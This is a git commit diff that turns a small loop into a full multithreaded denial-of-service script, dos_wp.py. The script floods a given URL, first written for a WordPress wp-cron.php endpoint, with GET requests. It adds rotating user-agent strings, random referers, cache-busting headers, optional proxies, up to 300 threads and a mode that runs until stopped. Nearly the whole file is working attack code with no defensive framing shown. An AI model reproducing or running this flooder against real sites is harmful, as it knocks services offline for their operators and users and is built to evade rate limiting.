1c284c0c49e84091395bf35aab931476349dbbc8
Braiani <felipe.braianitech@gmail.com>
2024-09-14 18:15:02 -0400

    Criado um script para envio de requisições HTTP Get em Multithread

--- Python/Extras/dos_wp.py
+++ Python/Extras/dos_wp.py
@@ -1,14 +1,207 @@
 import requests
+import sys
+from threading import Thread
+import random
 
-url = "https://site-wordpress/wp-cron.php"
 
-tries = 9999
+request_counter = 0
+request_answered = 0
 
-count = 0
+def randomString(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-while count < tries:
+def set_default_header():
+    agents = [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.3 Chrome/120.0.6099.291 Electron/28.3.3 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.5 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.4.14 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; wuqiku) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
+      "Mozilla/5.0 (compatible; Cloudinary/1.0)",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.5.3 Chrome/114.0.5735.289 Electron/25.8.1 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) electron-react-boilerplate/4.6.0 Chrome/116.0.5845.228 Electron/26.6.7 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) obsidian/1.6.7 Chrome/124.0.6367.243 Electron/30.1.2 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+    ]
+    return {
+        "User-Agent": random.choice(agents),
+        'Cache-Control': 'no-cache',
+        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+        'Referer': 'http://www.google.com/?q=' + randomString(random.randint(5,10)),
+        'Keep-Alive': str(random.randint(110,120)),
+        'Connection': 'keep-alive'
+    }
+
+def handleStatusCode(status_code):
+    global request_answered
+    
+    request_answered += 1
+    if status_code == 200:
+        pass
+        # print('200 OK')
+    elif status_code == 429:
+        print('429 Too Many Requests')
+    elif status_code == 500:
+        print('500 Internal Server Error')
+    elif status_code == 503:
+        print('503 Service Unavailable')
+    else:
+        print(f'Unknown status code: {status_code}')
+
+def fetch_url(url, headers, proxies):
     try:
-        req = requests.get(url=url)
-        count +=1
-    except:
-        break
+        response = requests.get(url, headers=headers, proxies=proxies, allow_redirects=False)
+        handleStatusCode(response.status_code)
+
+    except requests.RequestException as e:
+        pass
+
+def run_attack(url_attack, tries_attack, proxies, threads):
+    global request_counter
+    global request_answered
+    max_threads = threads
+    threads = []
+
+    if tries_attack == -1:
+        print(f"Attacking {url_attack} until stopped")
+        while True:
+            try:
+                headers = set_default_header()
+                if len(threads) < max_threads:
+                    thread = Thread(target=fetch_url, args=(url_attack, headers, proxies))
+                    thread.start()
+                    threads.append(thread)
+                    request_counter += 1
+                else:
+                    while len(threads) > 0:
+                        for t in threads:
+                            if not t.is_alive():
+                                threads.remove(t)
+
+            except KeyboardInterrupt:
+                print('Attack stopped by user.')
+                break
+            except Exception as e:
+                print(f'Error during attack: {e}')
+                break
+
+        print(f'Total requests made: {request_counter} - Total requests answered: {request_answered}')
+    else:
+        print(f"Attacking {url_attack} with {tries_attack} requests")
+        for i in range(tries_attack):
+            try:
+                headers = set_default_header()
+
+                thread = Thread(target=fetch_url, args=(url_attack, headers, proxies))
+                thread.start()
+                threads.append(thread)
+                request_counter += 1
+            except KeyboardInterrupt:
+                print('Attack stopped by user.')
+                break
+            except Exception as e:
+                print(f'Error during attack: {e}')
+                break
+
+        while len(threads) > 0:
+            for t in threads:
+                if not t.is_alive():
+                    threads.remove(t)
+
+        print(f'Total requests made: {request_counter} - Total requests answered: {request_answered}')
+
+def help_message():
+    print("Usage: python dos_wp.py {options} -u <url>")
+    print("Options:")
+    print("  -t <tries>  Number of requests to send")
+    print("  -f  Force the attack until stop of the script")
+    print("  -p <url|ip:port>,<url|ip:port> Proxy to use")
+    print("  -m <max_threads> Maximum number of threads to use")
+
+def main():
+    if len(sys.argv) < 2 or sys.argv[1] in ("-h", "--help"):
+        help_message()
+        sys.exit(1)
+
+    if "-f" in sys.argv and "-t" in sys.argv:
+        print("You can't use -f and -t at the same time")
+        help_message()
+        sys.exit(1)
+
+    proxies = {}
+    if "-p" in sys.argv:
+        proxy = sys.argv[sys.argv.index("-p") + 1]
+        proxies = {
+            "http": f"http://{proxy}",
+            "https": f"https://{proxy}"
+        }
+
+    if "-t" in sys.argv:
+        tries = int(sys.argv[sys.argv.index("-t") + 1])
+    elif "-f" in sys.argv:
+        tries = -1
+    else:
+        tries = 100
+    
+    max_threads = 300
+    if "-m" in sys.argv:
+        max_threads = int(sys.argv[sys.argv.index("-m") + 1])
+    
+    try:
+        url = sys.argv[sys.argv.index("-u") + 1]
+    except ValueError:
+        help_message()
+        sys.exit(1)
+
+    run_attack(url, tries, proxies, max_threads)
+
+if __name__ == "__main__":
+    main()
